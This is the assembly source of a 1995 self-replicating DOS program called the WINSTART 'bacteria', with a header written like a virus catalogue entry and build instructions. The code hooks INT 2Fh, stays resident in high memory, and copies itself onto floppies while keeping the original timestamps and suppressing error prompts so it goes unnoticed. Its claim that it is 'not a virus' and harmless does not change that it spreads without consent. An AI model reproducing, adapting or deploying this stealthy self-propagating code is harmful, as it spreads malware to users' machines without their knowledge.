comment *


Virus Name:  BACTERIA
Aliases:     WINSTART
V Status:    New computer life form
Discovery:   February, 1995
Symptoms:    WINSTART.BAT files appear in C:\ and on half full floppies
Origin:      USA
Eff Length:  297 Bytes
Type Code:   Re - Extended HMA Memory Resident Non-infecting Bacteria
Detection Method:  None
Removal Instructions:  See Below

General Comments:

	The WINSTART BACTERIA is a new form of computer life.  It is not
	quite a virus.  It is not a trojan.  It is not a worm.  It is a
	bacteria.

	It does not spawn or attach or overwrite any files or boot sectors.
	It installs when Microsoft Windows starts up.  It creates itself on
	diskettes.

	The dictionary definition of a bacteria is:
	Any of numerous sometimes parasitic unicellular orginisms having
	various forms and often causing disease.

	The WINSTART BACTERIA meets this definition.  WINSTART is both a
	.BAT batch file and a .COM file (various forms).  It is unicellular;
	it does not mutate and remains a simple batch file WINSTART.BAT.
	The WINSTART BACTERIA can travel and install on new computers.  It is
	not parasitic.  WINSTART BACTERIA does not cause disease.

	The way that WINSTART.BAT is started, is to run Microsoft Windows and
	have WINSTART.BAT be in the current directory or in the PATH.
	WINSTART installs in it's batch file form by running WINSTART.BAT.
	After WINSTALL.BAT starts, it copies itself to C:\Q.COM.  It then
	runs C:\Q.COM.  Q.COM renames Q.COM to C:\WINSTART.BAT again.  Q.COM
	then goes memory resident in the HMA (High Memory Area).  If drive
	A: or B: become the default drive, WINSTART.BAT will copy itself to
	the Diskette in the current directory if the disk is more than half
	full.  The file date and time of WINSTART.BAT will not be changed to
	the current date and time.

	WINSTALL.BAT then travels on data disks.  If the contents of the disk
	are copied to another system, and Windows is started in the same
	directory as the WINSTART.BAT then the process can start all over
	again.  

	When the WINSTALL.BAT file is started by Windows, WINSTALL.BAT will
	move to the root directory of drive C:\.  This makes it very easy
	to go memory resident next time Windows starts up from the root
	directory.

	The WINSTART BACTERIA contains no payload.

	Removal is done by deleting all WINSTART.BAT files.

	*

;-----------------------------------------------------------------------------

.286


;designed by "Q" the misanthrope.


;tasm winstart /m1        
;tlink winstart /t
;ren winstart.com winstart.bat


cseg            segment byte public 'CODE'
		assume cs:cseg, es:cseg, ss:nothing, ds:cseg


		org    100h

batch_file:

		db      '@ECHO  OFF',0dh,0ah
		db      ':'
		jnc     com_code                ;goto com_code
		jc      com_code                ;be sure to get there
		db      0dh,0ah
		db      'COPY %0.BAT '          ;copy batch file to c:\q.com
source_file:    db      'C:\Q.COM'
null_terminate: db      '>NUL',0dh,0ah          ;don't let people see it
		db      'C:\Q',0dh,0ah          ;run the batch file as com file
		db      1ah                     ;ctrl-z terminate batch file
		

com_code        proc    near                    ;set c:\q.com null terminated
		mov     ax,0b700h               ;check install
		mov     byte ptr ds:[null_terminate],al
		int     2fh
		cmp     al,0ffh
		je      no_load                 ;if mem resident bypass move
com_code        endp


move_to_hma     proc    near                    ;allocated hma space 
		mov     di,0ffffh
		mov     bx,mem_res_end-mem_res_start+05h
		mov     ax,4a02h                ;5 extra bytes for luck
		int     2fh
		inc     di                      
		jz      no_load                 ;di=0 if no hma
		push    di                      ;else di=where to load
		cld
		mov     si,offset mem_res_start ;point to mem res code
		mov     cx,mem_res_end-mem_res_start
		rep     movsb                   ;move it to hma
move_to_hma     endp


hook_in_int_2f  proc    near
		mov     ds,cx                   ;int 2f chain always has
		mov     si,0706h                ;been at address 70:5
		movsw                           ;copy old int 2f address
		movsw                           ;to hma
		pop     word ptr ds:[si-04h]    ;link in hma code
		mov     word ptr ds:[si-04h+02h],es
hook_in_int_2f  endp


no_load         proc    near                    ;do some renaming and deletes
		push    cs
		push    cs
		mov     dx,offset source_file   ;ren c:\q.com c:\winstart.bat
		mov     di,offset rename_file
		pop     ds
		pop     es
		mov     ah,56h                  ;rename it
		int     21h
		mov     ah,41h                  ;del c:\q.com
		int     21h
		mov     dx,di
		inc     cx
		mov     ax,4301h                ;set c:\winstart.bat readonly
		int     21h
		int     20h                     ;leave the simple way
no_load         endp


mem_res_start   label   byte                    ;memory resident code


isr2f           proc    far
		cmp     ax,0b700h               ;installation check
		jne     check_command           ;also for APPEND
		mov     al,0ffh
		iret
check_command:  cmp     ax,0ae00h               ;check if installable command
		je      next_test               ;used by APPEND
goto_onward:    jmp     onward
next_test:      cmp     dx,0ffffh
		jne     goto_onward
		cmp     ch,dh
		jne     goto_onward
		pusha
		push    ds
		push    cs
		pop     ds
		mov     ah,19h                  ;get default drive
		int     21h
		mov     ah,36h                  ;get free disk space
		cwd                             ;default drive
		cmp     al,01h                  ;above drive b:
		ja      pop_n_go                ;then not interested
		int     21h
		shr     dx,1                    ;divide total clusters by 2
		cmp     bx,dx                   ;is the disk half full or half
		call    rename_offset           ;such a simple way to get dx
rename_file     db      'C:\WINSTART.BAT',0     ;instead of call next pop bp
rename_offset:  pop     dx                      ;sub bp,???? lea dx,[bp+????]
		mov     ax,3d40h                ;open file c:\winstart.bat
		ja      pop_n_go                ;empty for the pesimists
		int     21h
		jc      pop_n_go                ;failure then leave
		xchg    ax,bx
		mov     ax,5b00h                ;create a file winstart.bat
		xor     cx,cx                   ;normal attributes
		mov     ds,cx
		mov     di,0018h*04h            ;get and set int 24 to a fail
		push    word ptr ds:[di+(24h-18h)*04h]
		push    word ptr ds:[di+02h+(24h-18h)*04h]
		mov     word ptr ds:[di+(24h-18h)*04h],di
		mov     word ptr ds:[di+02h+(24h-18h)*04h],ds
		mov     word ptr ds:[di],5555h
		org     $-2
		mov     al,03h                  ;return a fail
		mov     byte ptr ds:[di+02h],55h
		org     $-1
		iret                            ;return back to caller
		push    cs
		pop     ds
		add     dl,03h                  ;just winstart.bat
		int     21h
		mov     ds,cx                   ;restore critical handler
		pop     word ptr ds:[di+02h+(24h-18h)*04h]      
		pop     word ptr ds:[di+(24h-18h)*04h]
		jc      close_n_go              ;failure then leave
		xchg    ax,bp
loop_copy:      push    bx
		mov     ah,3fh                  ;read c:\winstart.bat
		mov     dx,di                   ;read it at int 18's 4 bytes
		mov     cl,04h                  ;done this way because
		int     21h                     ;int 21 won't write to the hma
		xchg    ax,cx                   ;ax was bytes read
		mov     ah,40h                  ;now write it to floppy
		mov     bx,bp
		int     21h
		or      ax,ax                   ;zero bytes written?
		pop     bx
		jnz     loop_copy               ;if not then continue
		mov     ax,5700h                ;get original file date/time
		int     21h
		mov     ah,3eh                  ;close the file
		int     21h
		mov     bx,bp
		mov     ax,5701h                ;set file date/time
		int     21h
close_n_go:     mov     ah,3eh                  ;close the file
		int     21h
pop_n_go:       pop     ds
		popa
onward:         db      0eah                    ;jmp original int 2f
isr2f           endp


mem_res_end     label   byte


cseg            ends


		end    batch_file

